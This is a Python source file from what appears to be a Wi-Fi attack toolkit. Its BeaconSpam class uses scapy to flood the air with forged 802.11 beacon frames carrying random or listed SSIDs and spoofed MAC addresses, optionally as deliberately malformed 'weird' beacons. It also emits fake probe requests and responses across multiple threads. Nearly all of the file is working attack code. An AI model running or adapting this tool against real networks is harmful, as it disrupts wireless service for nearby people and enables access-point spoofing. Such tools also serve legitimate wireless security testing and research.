# beacon_spam.py
from scapy.all import *
from scapy.layers.dot11 import Dot11Beacon, Dot11Elt, Dot11ProbeReq, Dot11ProbeResp, Dot11AssoReq, Dot11Auth, Dot11, Dot11Deauth, RadioTap, Dot11AssoResp, Dot11Disas, Dot11QoS
import os
import time
from rich.console import Console
from rich.table import Table
from rich.live import Live
from random import choice
import threading

try:
    from FreewayTools.colors import cprint, wprint, cinput, ColorCodes
    from FreewayTools.git_downloader import download_folder_from_github

except ModuleNotFoundError:
    from colors import cprint, wprint, cinput, ColorCodes
    from git_downloader import download_folder_from_github


def random_mac():
    mac = [random.randint(0x00, 0xff) for _ in range(6)]
    mac[0] = (mac[0] & 0xfe) | 0x02
    return ':'.join(map(lambda x: format(x, '02x'), mac))

thread_event = threading.Event()

class BeaconSpam:
    def __init__(self, interface, parms):
        self.interface = interface
        self.parms = parms
        self.console = Console()
        self.verbose = True if "v" in self.parms else False
        self.randmac = True if "r" in self.parms else False
        self.statmac = cinput("Enter any static mac") if not self.randmac else ""
        self.rand_select = True if "2" in self.parms else False
        path = cinput(f"Enter file name ({ColorCodes().BRIGHT}{ColorCodes().WHITE}/lists{ColorCodes().RESET}{ColorCodes().CYAN} folder)") if "1" in self.parms else None
        self.ssid_list = self.load_ssid_list(path=path if path is not None else "ssid_list.txt") if "1" in self.parms or "2" in self.parms else None
        self.random_ssid_list = self.generate_random_ssid_list() if "3" in self.parms or "4" in self.parms else None
        self.weird_frames = True if "4" in self.parms else False
        self.device_mac = ""
        self.current_ssid = "Unitinialized"
        self.data = {"Beacons": 0, "Clients": 0, "Responses": 0}
        self.threads = cinput("Number of threads") if "t" in self.parms else 1

    def generate_random_ssid_list(self):
        l = "abcdefghijklmnoprstqwxyz"
        n = "0123456789"
        c = "!@#$%^&*()_+-=/?<.>,}{][;:\|~`"
        length = random.randint(8, 32)
        count = 2000
        ssids = []

        for _ in range(count):
            ssid_length = random.randint(8, length)
            ssid = ''.join(random.choice(l + n + c) for _ in range(ssid_length))
            ssids.append(ssid)

        return ssids

    def load_ssid_list(self, path="ssid_list.txt", path_d="/usr/local/share/3way/lists/"):
        try:
            if not os.path.exists(path_d):
                install_lists = cinput("/lists folder is not installed, install it now? (y/n)")
                if install_lists == "y":
                    cprint("Downloading the lists folder from GitHub...")
                    download_folder_from_github("FLOCK4H", "Freeway", "FreewayTools/lists", path_d)
                elif install_lists == "n":
                    wprint("Exiting due to missing folder exception! Please download lists folder.")
                    time.sleep(1)
                    sys.exit(0)

            joint = path_d + path
            if self.rand_select:
                files = os.listdir(path_d)
                cprint(f"Available files in '/usr/local/share/3way/lists/': {files}")
                path = choice(files)
                with open(path_d + path, "r") as f:
                    ssids = f.read()
                    ssids = ssids.split("\n")
                    return ssids                

            if os.path.exists(joint):
                with open(joint, "r") as f:
                    ssids = f.read()
                    ssids = ssids.split("\n")
                    return ssids
            else:
                with open(os.path.join(path_d, path), "r") as f:
                    ssids = f.read()
                    ssids = ssids.split("\n")
                    return ssids                


            if self.verbose:
                print(self.ssid_list, type(self.ssid_list))

        except Exception as e:
            wprint(f"In load_ssid_list in BeaconSpam class: {str(e)}")            

    def init_monitor_mode(self, mode="monitor"):
        try:
            for interface in self.interface:
                os.system(f'sudo iwconfig {interface} mode {mode}')
        except Exception as e:
            wprint(f"Error while putting interface in monitor mode: {e}")

    def weirdspammer(self, interface):
        while not thread_event.is_set():
            try:
                self.send_wframe(interface)
            except OSError:
                wprint("Network is down, retrying...")
            except ValueError:
                self.console.print("Catched ValueError due to oversized SSID, ignore it..", style="yellow")

    def bspammer(self, interface):
        while not thread_event.is_set():
            try:
                self.send_bframe(choice(self.ssid_list if self.ssid_list else self.random_ssid_list), interface)
            except OSError:
                wprint("Network is down, retrying...")
            except ValueError:
                self.console.print("Catched ValueError due to oversized SSID, ignore it..", style="yellow")

    def generate_corrupted_ssid(self):
        unusual_chars = [
            "\u200B", "\u200C", "\u200D", "\u202F", "\u205F", "\u2060",  # Spaces and invisible characters
            "ą", "ę", "ł", "ń", "ó", "ś", "ź", "ż",  # Polish characters
            "أ", "ب", "ت", "ث", "ج",  # Arabic characters
            "©", "®", "™", "℠",  # Copyright and trademark symbols
            "Ω", "π", "φ", "δ", "∞",  # Mathematical symbols
            "♥", "♦", "♣", "♠",  # Card suits
        ]
        length = random.randint(8, 102)
        return ''.join(random.choice(unusual_chars) for _ in range(length))

    def send_wframe(self, interface):
        ssid = self.generate_corrupted_ssid()
        self.current_ssid = ssid
    
        smac = random_mac() if self.randmac else self.statmac
        if smac == "":
            """Prevent empty mac"""
            smac = "aa:33:bb:ee:aa:33"
        packet = self.craft_corrupted_beacon_packet(ssid=ssid, src_mac=smac, bssid=smac)
        sendp(packet, iface=interface, count=1, verbose=False)
        self.data["Beacons"] += 1

        if self.verbose:
            self.console.print(f"Sent weird packet with mac {smac}, ssid {ssid}", style="red")

    def craft_corrupted_beacon_packet(self, ssid, src_mac, bssid):
        if random.choice([True, False]):
            # Normal packet
            packet = RadioTap() / Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=src_mac, addr3=bssid) / Dot11Beacon(cap="ESS+privacy")
            packet /= Dot11Elt(ID="SSID", info=ssid)
            packet /= Dot11Elt(ID="Rates", info=b'\x82\x84\x8b\x96\x0c\x12\x18\x24')
            packet /= Dot11Elt(ID="DSset", info=chr(random.randint(1, 14)))
        else:
            # Weird packet
            packet = RadioTap() / Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=src_mac, addr3=bssid) / Dot11Beacon(cap="short-preamble+ESS")
            packet /= Dot11Elt(ID="SSID", info=ssid)
            packet /= Dot11Elt(ID="Rates", info=b'\x96\x82\x84\x0b\x16\x24\x30\x48\x6c')
            packet /= Dot11Elt(ID="Vendor", info="👻👽🤖".encode("utf-8"))  # Emoji in Vendor-specific element
            packet /= Dot11Elt(ID=221, info="♠♠♠♠♠♠♠♠♠♠♠♠♠♠♠♠♠♠")
            packet /= Dot11Elt(ID=42, info=b"\xde\xad\xbe\xef")  # unused/reserved ID
            packet /= Dot11Elt(ID='Country', info=b'XZ\x00\x01\x0b\x1e')  # country code

        return packet

    def send_bframe(self, ssid, interface):
        smac = random_mac() if self.randmac else self.statmac
        if smac == "":
            """Prevent empty mac"""
            smac = "aa:33:bb:ee:aa:33"
        self.current_ssid = ssid
        packet = self.craft_beacon_packet(ssid=ssid, src_mac=smac, bssid=smac)
        sendp(packet, iface=interface, count=1, verbose=False)
        self.data["Beacons"] += 1

        if self.verbose:
            self.console.print(f"Sent packets with mac {smac}, ssid {ssid}", style="green")

    def send_probe_request(self, interface, ssid):
        src_mac = random_mac()
        self.device_mac = src_mac
        radiotap = RadioTap()
        dot11 = Dot11(type=0, subtype=4, addr1="ff:ff:ff:ff:ff:ff", addr2=src_mac, addr3=src_mac)
        probe_req = Dot11ProbeReq()
        ssid = Dot11Elt(ID="SSID", info=ssid, len=len(ssid))
        packet = radiotap / dot11 / probe_req / ssid
        
        sendp(packet, iface=interface, count=1, verbose=False)
        self.data["Clients"] += 1

        if self.verbose:
            self.console.print(f"Sent probe request packet with mac {src_mac}, ssid {ssid}", style="green")
    
    def send_probe_response(self, interface, ssid):
        src_mac = random_mac()
        dst_mac = self.device_mac if self.device_mac != "" else random_mac()
        radiotap = RadioTap()
        dot11 = Dot11(type=0, subtype=5, addr1=dst_mac, addr2=src_mac, addr3=src_mac)
        probe_resp = Dot11ProbeResp(timestamp=int(time.time()*1000000), beacon_interval=0x0064, cap='ESS+privacy')
        ssid_elt = Dot11Elt(ID='SSID', info=ssid.encode())
        rates_elt = Dot11Elt(ID='Rates', info=b'\x82\x84\x8b\x96\x0c\x12\x18\x24')
        dsset_elt = Dot11Elt(ID='DSset', info=chr(1))
        packet = radiotap / dot11 / probe_resp / ssid_elt / rates_elt / dsset_elt
        
        sendp(packet, iface=interface, count=1, verbose=False)
        self.data["Responses"] += 1
        
        if self.verbose:
            self.console.print(f"Sent probe response packet with mac {src_mac}, ssid {ssid}", style="blue")
    
    def device_emulator(self, interface, ssid_list):
        while not thread_event.is_set():
            try:
            # Randomly select an SSID to associate with
                ssid = random.choice(ssid_list)
                self.send_probe_request(interface, ssid)

                self.send_probe_response(interface, ssid)
            except OSError:
                wprint("Network is down, putting this bastard back up..")

    def craft_beacon_packet(self, ssid, src_mac="12:34:56:78:9a:bc", dst_mac="ff:ff:ff:ff:ff:ff", bssid="12:34:56:78:9a:bc"):
        # Radiotap, Dot11, beacon, and SSID elements
        radiotap = RadioTap()
        dot11 = Dot11(type=0, subtype=8, addr1=dst_mac, addr2=src_mac, addr3=bssid)
        beacon = Dot11Beacon(cap='short-slot+ESS+privacy', beacon_interval=0x64)
        essid = Dot11Elt(ID='SSID', info=ssid.encode('utf-8'))  # Ensure SSID is properly encoded

        # Supported rates (standard rates + some higher rates for compatibility)
        rates = Dot11Elt(ID='Rates', info=b'\x82\x84\x8b\x96\x0c\x12\x18\x24')
        esrates = Dot11Elt(ID='ESRates', info=b'\x30\x48\x60\x6c')  # Extended Supported Rates
        
        # Channel set to a more common one (e.g., channel 1)
        dsset = Dot11Elt(ID='DSset', info=b'\x01')  # Common channel

        # Traffic Indication Map (TIM)
        tim = Dot11Elt(ID='TIM', info=b'\x00\x01\x00\x00')
        
        # ERP Information (Optional, but can help with compatibility)
        erp = Dot11Elt(ID='ERPinfo', info=b'\x00')
        
        # Country information set to PL (Poland)
        country = Dot11Elt(ID='Country', info=b'PL \x00\x01\x0b\x1e')
        
        # RSN Information
        rsn_info = Dot11Elt(ID='RSNinfo', info=(
            b'\x01\x00'              # RSN Version 1
            b'\x00\x0f\xac\x04'      # Group Cipher Suite: AES (CCMP)
            b'\x01\x00'              # 1 Pairwise Cipher Suite
            b'\x00\x0f\xac\x04'      # Pairwise Cipher Suite: AES (CCMP)
            b'\x01\x00'              # 1 Authentication Key Management Suite (AKM)
            b'\x00\x0f\xac\x02'      # AKM Suite: PSK
            b'\xac\x00'              # RSN Capabilities (MFP capable)
        ))

        # Assembling the packet
        packet = radiotap / dot11 / beacon / essid / rates / esrates / dsset / tim / erp / country / rsn_info

        return packet

    def table_view(self):
        table = Table()
        table.add_column("Beacons", style="magenta")  
        table.add_column("Clients", style="green") 
        table.add_column("Total", style="blue")
        table.add_column("SSID", style="yellow", justify="center")

        ssid = self.current_ssid
        beacons = self.data["Beacons"]
        clients = self.data["Clients"]
        responses = self.data["Responses"]
        total = beacons + clients + responses

        table.add_row(str(beacons), str(clients), str(total), str(ssid))
        return table  

    def run_spam(self):
        try:
            thread_event.clear()
            self.init_monitor_mode()
            for interface in self.interface:
                for thread in range(0, int(self.threads)):
                    
                    if self.weird_frames:
                        threading.Thread(target=self.weirdspammer, args=(interface,), daemon=True).start()
                        threading.Thread(target=self.device_emulator, args=(interface, self.random_ssid_list), daemon=True).start()
                    else:
                        threading.Thread(target=self.bspammer, args=(interface,), daemon=True).start()
                        threading.Thread(target=self.device_emulator, args=(interface, self.ssid_list if self.ssid_list else self.random_ssid_list), daemon=True).start()

            live_table = Live(self.table_view(), refresh_per_second=10, console=self.console, transient=True)
            print("")
            with live_table:
                while not thread_event.is_set():
                    live_table.update(self.table_view())
                    time.sleep(1)


        except KeyboardInterrupt:
            thread_event.set()
            time.sleep(1)
        finally:
            self.init_monitor_mode(mode="managed")